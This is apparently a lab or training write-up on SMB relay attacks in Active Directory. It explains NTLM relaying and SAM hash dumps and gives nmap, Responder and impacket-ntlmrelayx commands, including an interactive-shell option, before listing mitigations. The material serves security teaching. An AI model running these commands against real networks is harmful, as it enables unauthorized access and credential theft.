# SMB Relay

### What is SMB?

SMB (Server Message Block) is a network file-sharing protocol primarily used in Windows environments. It allows systems to share files, printers, and other resources over a network and supports authentication to access those resources.

### What can go wrong here?

An SMB relay attack occurs when an attacker intercepts NTLM authentication traffic intended for one machine and relays it to another without cracking the credentials. Instead of capturing hashes for offline attacks, the attacker reuses the authentication in real time to gain unauthorized access, often achieving code execution or administrative privileges on the relayed system.

SMB is vulnerable to relay attacks because NTLM authentication does not bind the client’s authentication attempt to the intended server. Without SMB signing, the protocol does not verify the integrity and authenticity of the messages, allowing attackers to insert themselves into the authentication process

### Attack Requirements

SMB signing must be disabled or not enforced on the target system, the relayed user must have local administrative rights for meaningful impact, and credentials cannot be relayed back to the machine they originated from. Since NTLM is reused directly, password strength has no effect on the attack’s success. Notably, most Windows workstations by default do not enforce SMB signing, making them susceptible

### SMB Relay in AD

#### Step 1: Identifying workstations without SMB Signing Enforced

```
nmap --script=smb2-security-mode.nse -p445 <target-ip> -Pn
```

#### Step 2: Setting up the attack

We first have to disable SMB and HTTP in Responder, as these will be forwarded to nlmrelayx.

```
sudo vim /etc/responder/Responder.conf

-- switch SMB and HTTP Off

sudo responder -I eth0 -dwv
```

```
impacket-ntlmrelayx -tf targets.txt -smb2support
```

```
-- to start a shell
impacket-ntlmrelayx -tf targets.txt -smb2support -i for shell
```

#### Step 3: An Event Occurs and Credentials Get Relayed

When an event (such as LLMNR poisoning) occurrs, responder will capture this event, pass it to ntlmrelayx, which will relay the credentials to the targets in our targets file.

In our lab we simulate an event by pointing to the attacker machine ip `\\10.0.2.15` on THEPUNISHER fcastle machine (fcastle is admin on SPIDERMAN so we can authenticate there and dump the local SAM hashes)

The SAM (Security Account Manager) is a database in Windows that stores local user account information, including hashed representations of passwords. When attackers “dump the SAM,” they extract these password hashes to attempt cracking or use them in pass-the-hash attacks.

Each entry in a dumped SAM file typically follows the format:
username:RID:LM hash:NT hash:::

- Username is the account name (e.g., Administrator, Guest, or a local user).

- RID (Relative Identifier) is a unique number associated with each account. For example, 500 usually corresponds to the built-in Administrator account, 501 to Guest, and 1000+ to user-created accounts.

- LM hash is the old LAN Manager hash of the password. In modern Windows systems, LM hashes are usually disabled by default and appear as the placeholder value aad3b435b51404eeaad3b435b51404ee.

- NT hash is the NTLM hash of the password, derived from the actual user password. This is the primary target for attackers since it can be cracked offline or used directly in authentication attacks.

### Mitigations

Mitigation strategies include enabling and enforcing SMB signing on all systems, disabling NTLM where possible, and using Kerberos as the preferred authentication method.
Restricting administrative privileges, segmenting networks, and applying the principle of least privilege reduce the value of relayed credentials.

#### References

- [https://tcm-sec.com/smb-relay-attacks-and-how-to-prevent-them/](https://tcm-sec.com/smb-relay-attacks-and-how-to-prevent-them/)
